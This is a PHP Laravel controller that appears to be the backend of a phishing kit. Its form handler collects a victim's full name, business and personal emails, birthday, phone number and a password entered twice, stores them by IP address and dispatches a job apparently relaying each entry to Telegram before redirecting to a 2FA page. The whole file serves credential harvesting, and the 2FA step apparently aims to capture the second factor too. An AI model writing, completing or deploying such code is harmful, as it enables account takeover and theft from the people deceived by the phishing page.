<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Http;
use App\Jobs\SendTelegramAccount;
use App\Models\Account;
use Illuminate\Http\Request;

class AccountController extends Controller
{
    public function index()
    {
        return view('pages.form');
    }

    public function store(Request $request)
    {  
        $request->validate([
        'first_password' => 'min:6',
        'second_password' => 'min:6',
        ]);
        
        $data = $request->only(
            'page',
            'fullname',
            'business_email',
            'personal_email',
            'birthday',
            'phone',
            'first_password',
            'second_password',
        );

        $account = Account::query()
            ->where('ip', request()->ip())
            ->latest('id')
            ->first();

        if ($request->num_enter_password == 1) {
            $account = Account::query()->create($data);

            dispatch(new SendTelegramAccount($account, $request->num_enter_password));
        }

        if ($request->num_enter_password == 2 && $account->exists()) {
            $account->update($data);

            dispatch(new SendTelegramAccount($account, $request->num_enter_password));
        }

        return response()->json([
            'url' => route('2fa', $account->id)
        ]);
    }
}
